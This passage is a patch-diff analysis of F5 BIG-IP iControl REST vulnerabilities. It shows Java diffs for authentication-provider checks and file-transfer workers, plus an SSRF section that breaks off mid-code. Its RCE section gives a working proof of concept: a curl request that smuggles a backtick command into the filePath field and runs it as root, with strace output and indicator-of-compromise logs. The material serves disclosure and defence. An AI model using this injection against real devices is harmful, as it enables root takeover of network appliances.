AuthnWorker.this.getLogger().warningFmt(\"Failed to subscribe to auth providers: %s\", new Object[] { RestHelper.throwableStackToString(ex) });\r\n         }\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           AuthnWorker.this.getLogger().fine(\"Successfully subscribed to auth providers\");\r\n\r\n           AuthzHelper.getAllAuthProviders(AuthnWorker.this.getServer(), new RestRequestCompletion()\r\n               {\r\n\r\n                 public void failed(Exception ex, RestOperation operation)\r\n                 {\r\n                   AuthnWorker.this.getLogger().warningFmt(\"Failed to get all auth providers: %s\", new Object[] { RestHelper.throwableStackToString(ex) });\r\n                 }\r\n\r\n\r\n\r\n\r\n                 public void completed(RestOperation operation) {\r\n                   AuthnWorker.this.processAuthProviderGroupNotification(operation);\r\n                 }\r\n               });\r\n         }\r\n       };\r\n\r\n\r\n     RestRequestCompletion notificationCompletion = new RestRequestCompletion()\r\n       {\r\n\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           AuthnWorker.this.getLogger().severeFmt(\"Notification from auth providers failed: %s\", new Object[] { RestHelper.throwableStackToString(ex) });\r\n         }\r\n\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           AuthnWorker.this.processAuthProviderGroupNotification(operation);\r\n         }\r\n       };\r\n\r\n     AuthzHelper.subscribeToAuthProviderGroup(getServer(), subscribeCompletion, notificationCompletion);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   private void processAuthProviderGroupNotification(RestOperation operation) {\r\n     RestResolverGroupEntry entry = (RestResolverGroupEntry)operation.getTypedBody(RestResolverGroupEntry.class);\r\n\r\n\r\n     if (entry.references != null) {\r\n       for (RestReference ref : entry.references) {\r\n         if (operation.getMethod().equals(RestOperation.RestMethod.DELETE)) {\r\n           unsubscribe(ref.link); continue;\r\n         }\r\n         subscribeToAuthProvider(ref.link);\r\n       }\r\n     }\r\n   }\r\n\r\n\r\n\r\n   private void lookupAuthProviderCollection(URI authProviderLink) {\r\n     this.lookupAuthRetryCountReferenceMap.put(authProviderLink, new AtomicInteger(0));\r\n     lookupAuthProviderCollectionRetry(authProviderLink);\r\n   }\r\n\r\n\r\n   private void lookupAuthProviderCollectionRetry(final URI authProviderLink) {\r\n     RestRequestCompletion completion = new RestRequestCompletion()\r\n       {\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           if (((AtomicInteger)AuthnWorker.this.lookupAuthRetryCountReferenceMap.get(authProviderLink)).intValue() > 10) {\r\n             AuthnWorker.this.getLogger().severeFmt(\"Max retries; failed to lookup auth provider %s: %s\", new Object[] { this.val$authProviderLink.toString(), RestHelper.throwableStackToString(ex) });\r\n\r\n             return;\r\n           }\r\n\r\n           AuthnWorker.this.getLogger().warningFmt(\"Failed to lookup auth provider %s: Retry number %s\", new Object[] { this.val$authProviderLink.toString(), Integer.valueOf(((AtomicInteger)AuthnWorker.access$100(this.this$0).get(this.val$authProviderLink)).intValue()) });\r\n\r\n\r\n           AuthnWorker.this.scheduleTaskOnce(new Runnable()\r\n               {\r\n                 public void run() {\r\n                   ((AtomicInteger)AuthnWorker.this.lookupAuthRetryCountReferenceMap.get(authProviderLink)).incrementAndGet();\r\n                   AuthnWorker.this.lookupAuthProviderCollectionRetry(authProviderLink);\r\n                 }\r\n               },  AuthnWorker.this.LOOKUP_AUTH_MAX_WAIT_MILLIS);\r\n         }\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           AuthProviderCollectionState collectionState = (AuthProviderCollectionState)operation.getTypedBody(AuthProviderCollectionState.class);\r\n\r\n\r\n           for (AuthProviderState item : collectionState.items) {\r\n             AuthnWorker.this.addAuthProvider(item);\r\n           }\r\n           AuthnWorker.this.lookupAuthRetryCountReferenceMap.remove(authProviderLink);\r\n         }\r\n       };\r\n\r\n     RestOperation op = RestOperation.create().setUri(makeLocalUri(authProviderLink)).setCompletion(completion);\r\n\r\n     sendGet(op);\r\n   }\r\n\r\n\r\n   private void unsubscribe(URI providerCollectionLink) {\r\n     URI notificationWorkerUri = this.subscriptions.get(providerCollectionLink);\r\n\r\n     if (notificationWorkerUri == null) {\r\n       return;\r\n     }\r\n\r\n     RestOperation subscribeRequest = RestOperation.create().setUri(makeLocalUri(providerCollectionLink));\r\n\r\n     try {\r\n       sendDeleteForSubscription(subscribeRequest, notificationWorkerUri);\r\n     } catch (Exception e) {\r\n       getLogger().fineFmt(\"Failed to unsubscribe to %s: %s\", new Object[] { providerCollectionLink.getPath(), RestHelper.throwableStackToString(e) });\r\n     }\r\n   }\r\n\r\n\r\n   private void subscribeToAuthProvider(final URI providerCollectionLink) {\r\n     RestRequestCompletion notificationCompletion = new RestRequestCompletion()\r\n       {\r\n         public void completed(RestOperation operation)\r\n         {\r\n           AuthProviderState state = (AuthProviderState)operation.getTypedBody(AuthProviderState.class);\r\n\r\n           if (operation.getMethod().equals(RestOperation.RestMethod.DELETE)) {\r\n             AuthnWorker.this.removeAuthProvider(state);\r\n           } else {\r\n             AuthnWorker.this.addAuthProvider(state);\r\n           }\r\n         }\r\n\r\n\r\n\r\n         public void failed(Exception ex, RestOperation operation) {\r\n           AuthnWorker.this.getLogger().severeFmt(\"%s\", new Object[] { ex.getMessage() });\r\n         }\r\n       };\r\n\r\n\r\n     RestRequestCompletion subscribeCompletion = new RestRequestCompletion()\r\n       {\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           AuthnWorker.this.getLogger().severeFmt(\"Failed to subscribe to auth provider %s: %s\", new Object[] { this.val$providerCollectionLink.getPath(), RestHelper.throwableStackToString(ex) });\r\n         }\r\n\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           AuthnWorker.this.getLogger().fine(\"Successfully subscribed to auth provider.\");\r\n           AuthnWorker.this.lookupAuthProviderCollection(providerCollectionLink);\r\n         }\r\n       };\r\n\r\n\r\n     RestOperation subscribeRequest = RestOperation.create().setUri(makeLocalUri(providerCollectionLink)).setCompletion(subscribeCompletion);\r\n\r\n     try {\r\n       URI notificationUri = sendPostForSubscription(subscribeRequest, getServer(), notificationCompletion);\r\n\r\n       this.subscriptions.put(providerCollectionLink, notificationUri);\r\n     } catch (Exception e) {\r\n       getLogger().severeFmt(\"Error while subscribing to %s: %s\", new Object[] { providerCollectionLink.getPath(), RestHelper.throwableStackToString(e) });\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n   private void addAuthProvider(AuthProviderState state) {\r\n     getLogger().fineFmt(\"Added a new auth provider [%s] at [%s].\", new Object[] { state.name, state.loginReference.link });\r\n\r\n     this.loginNameToReferenceMap.put(state.name, state.loginReference);\r\n   }\r\n\r\n   private void removeAuthProvider(AuthProviderState state) {\r\n     getLogger().fineFmt(\"Removed an auth provider %s.\", new Object[] { state.name });\r\n     this.loginNameToReferenceMap.remove(state.name);\r\n   }\r\n\r\n\r\n   protected void onPost(final RestOperation request) {\r\n     final String incomingAddress = request.getRemoteSender();\r\n\r\n     final AuthnWorkerState state = (AuthnWorkerState)request.getTypedBody(AuthnWorkerState.class);\r\n     AuthProviderLoginState loginState = (AuthProviderLoginState)request.getTypedBody(AuthProviderLoginState.class);\r\n\r\n\r\n-    if (state.password == null && state.bigipAuthCookie == null) {\r\n+    if (Utilities.isNullOrEmpty(state.password) && Utilities.isNullOrEmpty(state.bigipAuthCookie)) {\r\n       state.bigipAuthCookie = request.getCookie(\"BIGIPAuthCookie\");\r\n       loginState.bigipAuthCookie = state.bigipAuthCookie;\r\n     }\r\n\r\n     if (incomingAddress != null && incomingAddress != \"Unknown\") {\r\n       loginState.address = incomingAddress;\r\n     }\r\n\r\n-    if ((state.username == null || state.password == null) && state.bigipAuthCookie == null) {\r\n+    if ((Utilities.isNullOrEmpty(state.username) || Utilities.isNullOrEmpty(state.password)) && Utilities.isNullOrEmpty(state.bigipAuthCookie)) {\r\n+\r\n       request.setStatusCode(401);\r\n       String msg = String.format(\"username and password must not be null or %s in Cookie header should be used.\", new Object[] { \"BIGIPAuthCookie\" });\r\n\r\n       request.fail(new SecurityException(msg));\r\n\r\n+\r\n       return;\r\n     }\r\n\r\n+    boolean isAllowedLinks = false;\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+    if (state.loginReference != null && state.loginReference.link != null) {\r\n+\r\n+      for (URI iter : this.subscriptions.keySet()) {\r\n+        if (state.loginReference.link.getPath().equals(iter.getPath())) {\r\n+          isAllowedLinks = true;\r\n+          break;\r\n+        }\r\n+      }\r\n+      if (!isAllowedLinks) {\r\n+        getLogger().severe(\"No login provider found.\");\r\n+        String msg = String.format(\"No login provider found.\", new Object[0]);\r\n+        request.fail(new SecurityException(msg));\r\n+\r\n+        return;\r\n+      }\r\n+    }\r\n+\r\n     state.password = null;\r\n     request.setBody(state);\r\n\r\n\r\n\r\n     if (state.loginReference == null) {\r\n       if (state.loginProviderName == null) {\r\n         ExecutorService executorService = Executors.newSingleThreadExecutor();\r\n         Callable<String> callable = new Callable<String>()\r\n           {\r\n             public String call() throws Exception {\r\n               final String[] providerName = { null };\r\n               RestRequestCompletion getAuthSourceTypeCompletion = new RestRequestCompletion()\r\n                 {\r\n                   public void completed(RestOperation response) {\r\n                     AuthSourceState sourceState = (AuthSourceState)response.getTypedBody(AuthSourceState.class);\r\n                     if (\"local\".equals(sourceState.type)) {\r\n                       providerName[0] = \"local\";\r\n                     } else {\r\n                       providerName[0] = \"tmos\";\r\n                     }\r\n                   }\r\n\r\n\r\n                   public void failed(Exception ex, RestOperation response) {\r\n                     request.fail(ex);\r\n                   }\r\n                 };\r\n\r\n               AuthzHelper.getAuthSource(AuthnWorker.this.getServer(), getAuthSourceTypeCompletion);\r\n               try {\r\n                 int remainingSleepTime = 800, numberOfAttempts = 0;\r\n                 int multiplier = 1; numberOfAttempts = 1;\r\n                 for (; providerName[0] == null;\r\n                   multiplier *= 2, numberOfAttempts++) {\r\n\r\n                   TimeUnit.MILLISECONDS.sleep((10 * multiplier));\r\n                   remainingSleepTime -= 10 * multiplier;\r\n                   if (providerName[0] != null || numberOfAttempts == 5) {\r\n                     break;\r\n                   }\r\n                 }\r\n\r\n                 while (providerName[0] == null) {\r\n                   TimeUnit.MILLISECONDS.sleep(50L);\r\n                   remainingSleepTime -= 50;\r\n                 }\r\n                 AuthnWorker.this.getLogger().fine(\"Total Time taken to set the loginProviderName is \" + (800 - remainingSleepTime) + \"ms\");\r\n               } catch (InterruptedException e) {\r\n                 AuthnWorker.this.getLogger().severe(\"Error while setting value to loginProviderName when no loginReference and no loginProviderName were given\");\r\n               }\r\n               return providerName[0];\r\n             }\r\n           };\r\n\r\n         Future<String> future = executorService.submit(callable);\r\n         try {\r\n           state.loginProviderName = future.get(800L, TimeUnit.MILLISECONDS);\r\n           executorService.shutdown();\r\n         } catch (TimeoutException e) {\r\n           getLogger().severe(\"Maximum wait time(800ms) exceeded while getting value of loginProviderName\");\r\n           future.cancel(true);\r\n           if (!executorService.isShutdown()) {\r\n             executorService.shutdown();\r\n           }\r\n         } catch (CancellationException|java.util.concurrent.ExecutionException|InterruptedException e) {\r\n           getLogger().severe(\"Error while getting value of loginProviderName:\" + RestHelper.throwableStackToString(e));\r\n           if (!executorService.isShutdown()) {\r\n             executorService.shutdown();\r\n           }\r\n         }\r\n         getLogger().fineFmt(\"loginProviderName set to %s as default value, based on authentication source type when it was null\", new Object[] { state.loginProviderName });\r\n       }\r\n\r\n       if (state.loginProviderName != null) {\r\n         if (state.loginProviderName.equals(\"local\")) {\r\n           state.loginReference = new RestReference(makePublicUri(LocalAuthLoginWorker.WORKER_URI_PATH));\r\n         }\r\n         else if (this.loginNameToReferenceMap.containsKey(state.loginProviderName)) {\r\n           state.loginReference = this.loginNameToReferenceMap.get(state.loginProviderName);\r\n         } else {\r\n           request.fail(new IllegalArgumentException(\"loginProviderName is invalid.\"));\r\n           return;\r\n         }\r\n       } else {\r\n         request.fail(new IllegalArgumentException(\"loginProviderName is null.\"));\r\n\r\n\r\n         return;\r\n       }\r\n     }\r\n\r\n     final String failureKey = String.format(\"%s:%s\", new Object[] { (state.username == null) ? state.bigipAuthCookie : state.username, state.loginReference.link });\r\n\r\n\r\n\r\n     LoginFailures failures = this.loginFailureMap.get(failureKey);\r\n\r\n     if (failures != null && failures.failures >= 5) {\r\n       if (RestHelper.getNowMicrosUtc() - failures.lastFailureMicros < FAILED_ATTEMPTS_TIMEOUT) {\r\n         request.setStatusCode(401);\r\n         request.fail(new SecurityException(\"Maximum number of login attempts exceeded.\"));\r\n         return;\r\n       }\r\n       this.loginFailureMap.remove(failureKey);\r\n     }\r\n\r\n\r\n     RestRequestCompletion authCompletion = new RestRequestCompletion()\r\n       {\r\n\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           String loginProviderId = (state.loginProviderName == null) ? state.loginReference.link.toString() : state.loginProviderName;\r\n\r\n\r\n           String clientId = (state.username == null) ? (\"Cookie \" + state.bigipAuthCookie) : (\"User \" + state.username);\r\n\r\n           AuthnWorker.this.getLogger().infoFmt(\"%s failed to login from %s using the %s authentication provider\", new Object[] { clientId, this.val$incomingAddress, loginProviderId });\r\n\r\n\r\n           AuthnWorker.LoginFailures failures = (AuthnWorker.LoginFailures)AuthnWorker.this.loginFailureMap.get(failureKey);\r\n           if (failures == null) {\r\n             failures = new AuthnWorker.LoginFailures();\r\n             AuthnWorker.this.loginFailureMap.put(failureKey, failures);\r\n           }\r\n           failures.lastFailureMicros = RestHelper.getNowMicrosUtc();\r\n           failures.failures++;\r\n\r\n           request.setStatusCode(401);\r\n\r\n           if (ex.getMessage() == null || ex.getMessage().isEmpty()) {\r\n             request.fail(ex, RestErrorResponse.create().setMessage(\"Unable to login using supplied information. If you are attempting to login with a configured authentication provider it may be unavailable or no longer exist.\"));\r\n             return;\r\n           }\r\n           request.fail(ex);\r\n         }\r\n\r\n\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           AuthnWorker.this.loginFailureMap.remove(failureKey);\r\n\r\n           AuthProviderLoginState loggedIn = (AuthProviderLoginState)operation.getTypedBody(AuthProviderLoginState.class);\r\n\r\n\r\n           String authProviderId = loggedIn.authProviderName;\r\n           if (authProviderId == null) {\r\n             authProviderId = (state.loginProviderName == null) ? state.loginReference.link.toString() : state.loginProviderName;\r\n           }\r\n\r\n\r\n           AuthnWorker.this.getLogger().finestFmt(\"User %s successfully logged in from %s using the %s authentication provider.\", new Object[] { loggedIn.username, this.val$incomingAddress, authProviderId });\r\n\r\n\r\n\r\n\r\n           AuthnWorker.generateToken(AuthnWorker.this.getServer(), request, state, loggedIn);\r\n         }\r\n       };\r\n\r\n     RestOperation checkAuth = RestOperation.create().setBody(loginState).setUri(makeLocalUri(state.loginReference.link)).setCompletion(authCompletion);\r\n\r\n\r\n     sendPost(checkAuth);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static void generateToken(RestServer server, final RestOperation request, final AuthnWorkerState authState, AuthProviderLoginState loginState) {\r\n     if (authState.needsToken != null && !authState.needsToken.booleanValue()) {\r\n       request.setBody(authState);\r\n       request.complete();\r\n\r\n       return;\r\n     }\r\n     AuthTokenItemState token = new AuthTokenItemState();\r\n     token.userName = loginState.username;\r\n     token.user = loginState.userReference;\r\n     token.groupReferences = loginState.groupReferences;\r\n     token.authProviderName = loginState.authProviderName;\r\n     token.address = request.getXForwarderdFor();\r\n\r\n     RestRequestCompletion tokenCompletion = new RestRequestCompletion()\r\n       {\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           request.fail(ex);\r\n         }\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           AuthTokenItemState token = (AuthTokenItemState)operation.getTypedBody(AuthTokenItemState.class);\r\n           authState.token = token;\r\n           request.setBody(authState);\r\n           request.complete();\r\n         }\r\n       };\r\n\r\n\r\n     RestOperation createToken = RestOperation.create().setUri(UrlHelper.buildLocalUriSafe(server, new String[] { WellKnownPorts.AUTHZ_TOKEN_WORKER_URI_PATH })).setBody(token).setCompletion(tokenCompletion).setReferer(\"authn-generate-token\");\r\n\r\n\r\n\r\n\r\n\r\n     RestRequestSender.sendPost(createToken);\r\n   }\r\n }\r\ndiff --git a/com/f5/rest/workers/liveupdate/LiveUpdateDownloadWorker.java b/com/f5/rest/workers/liveupdate/LiveUpdateDownloadWorker.java\r\nindex 5e33f0d..caba75d 100644\r\n--- a/com/f5/rest/workers/liveupdate/LiveUpdateDownloadWorker.java\r\n+++ b/com/f5/rest/workers/liveupdate/LiveUpdateDownloadWorker.java\r\n@@ -1,17 +1,18 @@\r\n package com.f5.rest.workers.liveupdate;\r\n\r\n import com.f5.rest.common.RestWorker;\r\n-import com.f5.rest.workers.FileTransferWorker;\r\n+import com.f5.rest.workers.FileTransferPrivateWorker;\r\n\r\n-public class LiveUpdateDownloadWorker extends LiveUpdateFileTransferWorker {\r\n+public class LiveUpdateDownloadWorker\r\n+  extends LiveUpdateFileTransferWorker {\r\n   private String getDirectory;\r\n\r\n   public LiveUpdateDownloadWorker(String paramString1, String paramString2) {\r\n     super(paramString1);\r\n     this.getDirectory = paramString2;\r\n   }\r\n\r\n   protected RestWorker getRestWorker() throws Exception {\r\n-    return (RestWorker)new FileTransferWorker(this.getDirectory);\r\n+    return (RestWorker)new FileTransferPrivateWorker(this.getDirectory);\r\n   }\r\n }\r\ndiff --git a/com/f5/rest/workers/liveupdate/LiveUpdateUploadWorker.java b/com/f5/rest/workers/liveupdate/LiveUpdateUploadWorker.java\r\nindex 03cddd7..d46ac00 100644\r\n--- a/com/f5/rest/workers/liveupdate/LiveUpdateUploadWorker.java\r\n+++ b/com/f5/rest/workers/liveupdate/LiveUpdateUploadWorker.java\r\n@@ -1,59 +1,60 @@\r\n package com.f5.rest.workers.liveupdate;\r\n\r\n import com.f5.rest.common.RestOperation;\r\n import com.f5.rest.common.RestWorker;\r\n-import com.f5.rest.workers.FileTransferWorker;\r\n+import com.f5.rest.workers.FileTransferPrivateWorker;\r\n import java.io.File;\r\n import java.nio.file.Files;\r\n import java.nio.file.LinkOption;\r\n import java.nio.file.Path;\r\n import java.nio.file.Paths;\r\n import java.nio.file.attribute.GroupPrincipal;\r\n import java.nio.file.attribute.PosixFileAttributeView;\r\n import java.nio.file.attribute.PosixFileAttributes;\r\n import java.nio.file.attribute.UserPrincipal;\r\n import java.util.List;\r\n\r\n public class LiveUpdateUploadWorker\r\n-  extends LiveUpdateFileTransferWorker {\r\n+  extends LiveUpdateFileTransferWorker\r\n+{\r\n   private String postDirectory;\r\n   private String tmpDirectory;\r\n\r\n   public LiveUpdateUploadWorker(String paramString1, String paramString2, String paramString3) {\r\n     super(paramString1);\r\n     this.postDirectory = paramString2;\r\n     this.tmpDirectory = paramString3;\r\n   }\r\n\r\n   protected void onRequestComplete(RestOperation paramRestOperation) {\r\n     List list = paramRestOperation.getParsedCollectionEntries();\r\n     if (list != null && !list.isEmpty()) {\r\n       String str = \"/var/lib/hsqldb/live-update/update-files/\" + ((RestOperation.ParsedCollectionEntry)list.get(0)).entryKey;\r\n       File file = new File(str);\r\n       if (file.exists()) {\r\n\r\n         try {\r\n           File file1 = new File(\"/var/lib/hsqldb/live-update/update-files\");\r\n           PosixFileAttributes posixFileAttributes = Files.<PosixFileAttributes>readAttributes(file1.toPath(), PosixFileAttributes.class, new LinkOption[] { LinkOption.NOFOLLOW_LINKS });\r\n           GroupPrincipal groupPrincipal = posixFileAttributes.group();\r\n           UserPrincipal userPrincipal = posixFileAttributes.owner();\r\n\r\n           PosixFileAttributeView posixFileAttributeView = Files.<PosixFileAttributeView>getFileAttributeView(file.toPath(), PosixFileAttributeView.class, new LinkOption[] { LinkOption.NOFOLLOW_LINKS });\r\n           posixFileAttributeView.setGroup(groupPrincipal);\r\n\r\n           Path path = Paths.get(str, new String[0]);\r\n           Files.setOwner(path, userPrincipal);\r\n\r\n           file.setReadable(true, false);\r\n         } catch (Exception exception) {}\r\n       }\r\n     }\r\n   }\r\n\r\n\r\n   protected RestWorker getRestWorker() throws Exception {\r\n-    FileTransferWorker fileTransferWorker = new FileTransferWorker(this.postDirectory, this.tmpDirectory);\r\n-    fileTransferWorker.setPostFileGrooming(false);\r\n-    return (RestWorker)fileTransferWorker;\r\n+    FileTransferPrivateWorker fileTransferPrivateWorker = new FileTransferPrivateWorker(this.postDirectory, this.tmpDirectory);\r\n+    fileTransferPrivateWorker.setPostFileGrooming(false);\r\n+    return (RestWorker)fileTransferPrivateWorker;\r\n   }\r\n }\r\n```\r\n\r\n## RCE\r\n\r\nThis is a post-auth root command injection in a `tar(1)` command.\r\n\r\n### Patch\r\n\r\nFiltering is applied to the user-controlled `taskState.filePath` parameter.\r\n\r\n```diff\r\n[snip]\r\n+  private static final Pattern validFilePathChars = Pattern.compile(\"(^[a-zA-Z][a-zA-Z0-9_.\\\\-\\\\s()]*)\\\\.([tT][aA][rR]\\\\.[gG][zZ])$\");\r\n[snip]\r\n   private void validateGzipBundle(final IAppBundleInstallTaskState taskState) {\r\n     if (Utilities.isNullOrEmpty(taskState.filePath)) {\r\n       File agcUseCasePackDir = new File(\"/var/apm/f5-iappslx-agc-usecase-pack/\");\r\n       if (!agcUseCasePackDir.exists() || !agcUseCasePackDir.isDirectory()) {\r\n         String error = \"Access Guided Configuration use case pack not found on BIG-IP. Please upload and install the pack.\";\r\n         failTask(taskState, error, \"\");\r\n         return;\r\n       }\r\n       File[] agcUseCasePack = agcUseCasePackDir.listFiles();\r\n       if (agcUseCasePack == null || agcUseCasePack.length == 0 || !agcUseCasePack[0].isFile()) {\r\n\r\n         String error = \"Access Guided Configuration use case pack not found on BIG-IP. Please upload and install the pack.\";\r\n         failTask(taskState, error, \"\");\r\n         return;\r\n       }\r\n       taskState.filePath = agcUseCasePack[0].getPath();\r\n     }\r\n\r\n+    String filename = taskState.filePath.substring(taskState.filePath.lastIndexOf('/') + 1);\r\n+    Matcher m = validFilePathChars.matcher(filename);\r\n+    if (!m.matches()) {\r\n+      String errorMessage = String.format(\"Access Guided Configuration use case pack validation failed: the file name %s must begin with alphabet, and only contain letters, numbers, spaces and/or special characters (underscore (_), period (.), hyphen (-) and round brackets ()). Only a .tar.gz file is allowed\", new Object[] { filename });\r\n+\r\n+\r\n+\r\n+      failTask(taskState, errorMessage, \"\");\r\n+\r\n+      return;\r\n+    }\r\n     final String extractTarCommand = \"tar -xf \" + taskState.filePath + \" -O > /dev/null\";\r\n\r\n\r\n     ShellExecutor extractTar = new ShellExecutor(extractTarCommand);\r\n\r\n     CompletionHandler<ShellExecutionResult> executionFinishedHandler = new CompletionHandler<ShellExecutionResult>()\r\n       {\r\n         public void completed(ShellExecutionResult extractQueryResult)\r\n         {\r\n           if (extractQueryResult.getExitStatus().intValue() != 0) {\r\n             String error = extractTarCommand + \" failed with exit code=\" + extractQueryResult.getExitStatus();\r\n\r\n\r\n             IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, \"Usecase pack validation failed. Please ensure that usecase pack is a valid tar archive.\", error + \"stdout + stderr=\" + extractQueryResult.getOutput());\r\n\r\n\r\n             return;\r\n           }\r\n\r\n\r\n           taskState.step = IAppBundleInstallTaskState.IAppBundleInstallStep.QUERY_INSTALLED_RPM;\r\n           IAppBundleInstallTaskCollectionWorker.this.sendStatusUpdate(taskState);\r\n         }\r\n\r\n\r\n         public void failed(Exception ex, ShellExecutionResult rpmQueryResult) {\r\n           IAppBundleInstallTaskCollectionWorker.this.failTask(taskState, \"Usecase pack validation failed. Please ensure that usecase pack is a valid tar archive.\", String.format(\"%s failed\", new Object[] { this.val$extractTarCommand }) + RestHelper.throwableStackToString(ex));\r\n         }\r\n       };\r\n\r\n\r\n\r\n     extractTar.startExecution(executionFinishedHandler);\r\n   }\r\n[snip]\r\n```\r\n\r\n### PoC\r\n\r\nThe affected endpoint is `/mgmt/tm/access/bundle-install-tasks`.\r\n\r\n```\r\nwvu@kharak:~$ curl -ksu admin:[redacted] https://192.168.123.134/mgmt/tm/access/bundle-install-tasks -d '{\"filePath\":\"`id`\"}' | jq .\r\n{\r\n  \"filePath\": \"`id`\",\r\n  \"toBeInstalledAppRpmsIndex\": -1,\r\n  \"id\": \"36671f83-d1be-4f5a-a2e6-7f9442a2a76f\",\r\n  \"status\": \"CREATED\",\r\n  \"userReference\": {\r\n    \"link\": \"https://localhost/mgmt/shared/authz/users/admin\"\r\n  },\r\n  \"identityReferences\": [\r\n    {\r\n      \"link\": \"https://localhost/mgmt/shared/authz/users/admin\"\r\n    }\r\n  ],\r\n  \"ownerMachineId\": \"ac2562f0-e41f-4652-ba35-6a2b804b235e\",\r\n  \"generation\": 1,\r\n  \"lastUpdateMicros\": 1615930477819656,\r\n  \"kind\": \"tm:access:bundle-install-tasks:iappbundleinstalltaskstate\",\r\n  \"selfLink\": \"https://localhost/mgmt/tm/access/bundle-install-tasks/36671f83-d1be-4f5a-a2e6-7f9442a2a76f\"\r\n}\r\nwvu@kharak:~$\r\n```\r\n\r\nThe `id(1)` command is executed as root.\r\n\r\n```\r\n[pid 64748] execve(\"/bin/tar\", [\"tar\", \"-xf\", \"uid=0(root)\", \"gid=0(root)\", \"groups=0(root)\", \"context=system_u:system_r:initrc_t:s0\", \"-O\"], [/* 9 vars */]) = 0\r\n```\r\n\r\n### IOCs\r\n\r\nAn error may be seen in `/var/log/restjavad.0.log`. This log file is rotated.\r\n\r\n```\r\n[SEVERE][10029][16 Mar 2021 21:34:37 UTC][8100/tm/access/bundle-install-tasks IAppBundleInstallTaskCollectionWorker] Usecase pack validation failed. Please ensure that usecase pack is a valid tar archive. error details: tar -xf `id` -O > /dev/null failedorg.apache.commons.exec.ExecuteException: Process exited with an error: 2 (Exit value: 2)\r\n\tat org.apache.commons.exec.DefaultExecutor.executeInternal(DefaultExecutor.java:404)\r\n\tat org.apache.commons.exec.DefaultExecutor.access$200(DefaultExecutor.java:48)\r\n\tat org.apache.commons.exec.DefaultExecutor$1.run(DefaultExecutor.java:200)\r\n\tat java.lang.Thread.run(Thread.java:748)\r\n```\r\n\r\n## SSRF?\r\n\r\nApache on port 443 talks to `restjavad` on port 8100, which spawns and talks to `/usr/bin/icrd_child` on an ephemeral port.\r\n\r\n### Patch\r\n\r\nValidation is applied to the user-controlled `state.loginReference.link` parameter.\r\n\r\n```diff\r\n[snip]\r\n   protected void onPost(final RestOperation request) {\r\n     final String incomingAddress = request.getRemoteSender();\r\n\r\n     final AuthnWorkerState state = (AuthnWorkerState)request.getTypedBody(AuthnWorkerState.class);\r\n     AuthProviderLoginState loginState = (AuthProviderLoginState)request.getTypedBody(AuthProviderLoginState.class);\r\n\r\n\r\n-    if (state.password == null && state.bigipAuthCookie == null) {\r\n+    if (Utilities.isNullOrEmpty(state.password) && Utilities.isNullOrEmpty(state.bigipAuthCookie)) {\r\n       state.bigipAuthCookie = request.getCookie(\"BIGIPAuthCookie\");\r\n       loginState.bigipAuthCookie = state.bigipAuthCookie;\r\n     }\r\n\r\n     if (incomingAddress != null && incomingAddress != \"Unknown\") {\r\n       loginState.address = incomingAddress;\r\n     }\r\n\r\n-    if ((state.username == null || state.password == null) && state.bigipAuthCookie == null) {\r\n+    if ((Utilities.isNullOrEmpty(state.username) || Utilities.isNullOrEmpty(state.password)) && Utilities.isNullOrEmpty(state.bigipAuthCookie)) {\r\n+\r\n       request.setStatusCode(401);\r\n       String msg = String.format(\"username and password must not be null or %s in Cookie header should be used.\", new Object[] { \"BIGIPAuthCookie\" });\r\n\r\n       request.fail(new SecurityException(msg));\r\n\r\n+\r\n       return;\r\n     }\r\n\r\n+    boolean isAllowedLinks = false;\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+    if (state.loginReference != null && state.loginReference.link != null) {\r\n+\r\n+      for (URI iter : this.subscriptions.keySet()) {\r\n+        if (state.loginReference.link.getPath().equals(iter.getPath())) {\r\n+          isAllowedLinks = true;\r\n+          break;\r\n+        }\r\n+      }\r\n+      if (!isAllowedLinks) {\r\n+        getLogger().severe(\"No login provider found.\");\r\n+        String msg = String.format(\"No login provider found.\", new Object[0]);\r\n+        request.fail(new SecurityException(msg));\r\n+\r\n+        return;\r\n+      }\r\n+    }\r\n+\r\n     state.password = null;\r\n     request.setBody(state);\r\n\r\n\r\n\r\n     if (state.loginReference == null) {\r\n       if (state.loginProviderName == null) {\r\n         ExecutorService executorService = Executors.newSingleThreadExecutor();\r\n         Callable<String> callable = new Callable<String>()\r\n           {\r\n             public String call() throws Exception {\r\n               final String[] providerName = { null };\r\n               RestRequestCompletion getAuthSourceTypeCompletion = new RestRequestCompletion()\r\n                 {\r\n                   public void completed(RestOperation response) {\r\n                     AuthSourceState sourceState = (AuthSourceState)response.getTypedBody(AuthSourceState.class);\r\n                     if (\"local\".equals(sourceState.type)) {\r\n                       providerName[0] = \"local\";\r\n                     } else {\r\n                       providerName[0] = \"tmos\";\r\n                     }\r\n                   }\r\n\r\n\r\n                   public void failed(Exception ex, RestOperation response) {\r\n                     request.fail(ex);\r\n                   }\r\n                 };\r\n\r\n               AuthzHelper.getAuthSource(AuthnWorker.this.getServer(), getAuthSourceTypeCompletion);\r\n               try {\r\n                 int remainingSleepTime = 800, numberOfAttempts = 0;\r\n                 int multiplier = 1; numberOfAttempts = 1;\r\n                 for (; providerName[0] == null;\r\n                   multiplier *= 2, numberOfAttempts++) {\r\n\r\n                   TimeUnit.MILLISECONDS.sleep((10 * multiplier));\r\n                   remainingSleepTime -= 10 * multiplier;\r\n                   if (providerName[0] != null || numberOfAttempts == 5) {\r\n                     break;\r\n                   }\r\n                 }\r\n\r\n                 while (providerName[0] == null) {\r\n                   TimeUnit.MILLISECONDS.sleep(50L);\r\n                   remainingSleepTime -= 50;\r\n                 }\r\n                 AuthnWorker.this.getLogger().fine(\"Total 